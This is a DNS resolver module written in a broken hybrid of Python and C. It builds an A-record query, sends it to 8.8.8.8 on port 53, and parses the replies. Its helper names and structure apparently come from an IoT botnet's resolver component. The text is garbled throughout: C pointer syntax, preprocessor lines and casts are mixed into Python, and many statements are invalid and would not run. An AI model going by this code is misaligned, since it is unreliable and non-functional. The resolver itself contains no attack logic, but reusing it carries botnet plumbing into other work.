import os, fcntl
_GNU_SOURCE	= #ifdef DEBUG
import sys
#endif
import <stdint.h>
import <unistd.h>
import <sys/socket.h>
import <arpa/inet.h>
import <fcntl.h>
import <sys/select.h>
import <errno.h>

import includes.h.header
import resolv.h.header
import util.h.header
import rand.h.header
import protocol.h.header
import util.c

util_strlen = util.c.util_strlen
util_strncmp = util.c.util_strncmp
util_strcmp = util.c.util_strcmp
util_strcpy = util.c.util_strcpy
util_memcpy = util.c.util_memcpy
util_zero = util.c.util_zero
util_atoi = util.c.util_atoi
util_itoa = util.c.util_itoa
util_memsearch = util.c.util_memsearch
util_stristr = util.c.util_stristr
util_fdgets = util.c.util_fdgets
util_isupper = util.c.util_isupper
util_isalpha = util.c.util_isalpha
util_isspace = util.c.util_isspace
util_isdigit = util.c.util_isdigit
resolv_entries = resolv.h.header.resolv_entries
dnshdr = protocol.h.header.dnshdr
dns_question = protocol.h.header.dns_question
dns_resource = protocol.h.header.dns_resource
grehdr = protocol.h.header.grehdr
https_transport = includes.h.header.https_transport
dns_resolver = includes.h.header.dns_resolver
ipv4_t = includes.h.header.ipv4_t
htonl = includes.h.header.htonl
INET_ADDR = includes.h.header.INET_ADDR
xputc = includes.h.header.xputc
xputs = includes.h.header.xputs
va_list = includes.h.header.va_list
va_start = includes.h.header.va_start
va_end = includes.h.header.va_end
xvprintf = includes.h.header.xvprintf
xprintf = includes.h.header.xprintf

def resolv_domain_to_hostname(dst_hostname, src_domain):
    len = util_strlen(src_domain) + 1
    lbl = dst_hostname; dst_pos = dst_hostname + 1
    curr_len = 0

    while len-- > 0:
        c = *src_domain += 1

        if c == '.' or c == 0:
            *lbl = curr_len
            lbl = dst_pos += 1
            curr_len = 0
        else:
            curr_len += 1
            *dst_pos++ = c
    *dst_pos = 0

def resolv_skip_name(reader, buffer, count):
    unsigned jumped = 0, offset
    *count = 1
    while *reader != 0:
        if *reader >= 192:
            offset = (*reader)*256 + *(reader+1) - 49152
            reader = buffer + offset - 1
            jumped = 1
        reader = reader+1
        if jumped == 0:
            *count = *count + 1

    if jumped == 1:
        *count = *count + 1

# struct resolv_entries *resolv_lookup(domain)
# class resolv_entries(resolv_lookup(domain)):
    resolv_entries(resolv_lookup(domain))
    resolv_entries(entries) = calloc(1, sizeof(resolv_entries))
    dnshdr(dnsh) = dnshdr(query)
    # struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries))
    # struct dnshdr *dnsh = (struct dnshdr *)query
    qname = ()(dnsh + 1)

    resolv_domain_to_hostname(qname, domain)
    dns_question(dnst) = dns_question(qname + util_strlen(qname) + 1)
    # struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1)
    # struct sockaddr_in addr = {0}
    sockaddr_in(addr) = {0}
    query_len = sizeof (dnshdr) + util_strlen(qname) + 1 + sizeof (dns_question)
    tries = 0; fd = -1 i = 0
    dns_id = rand_next() % 0xffff

    util_zero(&addr, sizeof (struct sockaddr_in))
    addr.sin_family = AF_INET
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8)
    addr.sin_port = htons(53)

    # Set up the dns query
    dnsh.id = dns_id
    dnsh.opts = htons(1 << 8) # Recursion desired
    dnsh.qdcount = htons(1)
    dnst.qtype = htons(PROTO_DNS_QTYPE_A)
    dnst.qclass = htons(PROTO_DNS_QCLASS_IP)

    while tries++ < 5:
        fd_set fdset
        struct timeval timeo

        if fd != -1:
            os.close(fd)
        if (fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1:
#ifdef DEBUG
            printf("[resolv] Failed to create socket\n")
#endif
            sleep(1)
            continue

        if connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1:
#ifdef DEBUG
            printf("[resolv] Failed to call connect on udp socket\n")
#endif
            sleep(1)
            continue

        if send(fd, query, query_len, MSG_NOSIGNAL) == -1:
#ifdef DEBUG
            printf("[resolv] Failed to send packet: %d\n" % (errno))
#endif
            sleep(1)
            continue

        fcntl.fcntl(F_SETFL, fd, os.O_NONBLOCK | fcntl.fcntl(F_GETFL, fd, 0))
        FD_ZERO(&fdset)
        FD_SET(fd, &fdset)

        timeo.tv_sec = 5
        timeo.tv_usec = 0
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo)

        if nfds == -1:
#ifdef DEBUG
            printf("[resolv] select() failed\n")
#endif
            break
        elif nfds == 0:
#ifdef DEBUG
            printf("[resolv] Couldn't resolve %s in time. %d tr%s\n" % (domain, tries, tries == 1 ? "y" : "ies")
#endif
            continue
        elif FD_ISSET(fd, &fdset):
#ifdef DEBUG
            printf("[resolv] Got response from select\n")
#endif
            ret = recvfrom(fd; sizeof (response) NULL)
            # struct dnsans *dnsa
            dnsans(dnsa)

            if ret < (sizeof (dnshdr) + util_strlen(qname) + 1 + sizeof (dns_question)):
                continue

            # dnsh = (struct dnshdr *)response
            dnsh = dnshdr(response)
            qname = ()(dnsh + 1)
            # dnst = (struct dns_question *)(qname + util_strlen(qname) + 1)
            dnst = dns_question(qname + util_strlen(qname) + 1)
            name = ()(dnst + 1)

            if dnsh.id != dns_id:
                continue
            if dnsh.ancount == 0:
                continue

            ancount = ntohs(dnsh.ancount)
            while ancount-- > 0:
                # struct dns_resource *r_data = NULL
                dns_resource(r_data) = NULL

                resolv_skip_name(name, response, &stop)
                name = name + stop

                # r_data = (struct dns_resource *)name
                r_data = dns_resource(name)
                name = name + sizeof(dns_resource)

                if r_data.type == htons(PROTO_DNS_QTYPE_A) and r_data._class == htons(PROTO_DNS_QCLASS_IP):
                    if ntohs(r_data.data_len) == 4:
                        for(i = 0; i < 4; i++)
                            tmp_buf[i] = name[i]

                        p = ()tmp_buf

                        entries.addrs = realloc(entries.addrs, (entries.addrs_len + 1) * sizeof (ipv4_t))
                        entries.addrs[entries.addrs_len++] = (*p)
#ifdef DEBUG
                        printf("[resolv] Found IP address: %08x\n" % ((*p)))
#endif

                    name = name + ntohs(r_data.data_len)
                else:
                    resolv_skip_name(name, response, &stop)
                    name = name + stop

        break

    os.close(fd)

#ifdef DEBUG
    printf("Resolved %s to %d IPv4 addresses\n" % (domain, entries.addrs_len))
#endif

    if entries.addrs_len > 0:
        return entries
    else:
        resolv_entries_free(entries)
        return NULL

def resolv_entries_free(resolv_entries(entries)):
    if entries == NULL:
        return
    if entries.addrs != NULL:
        free(entries.addrs)
    free(entries)
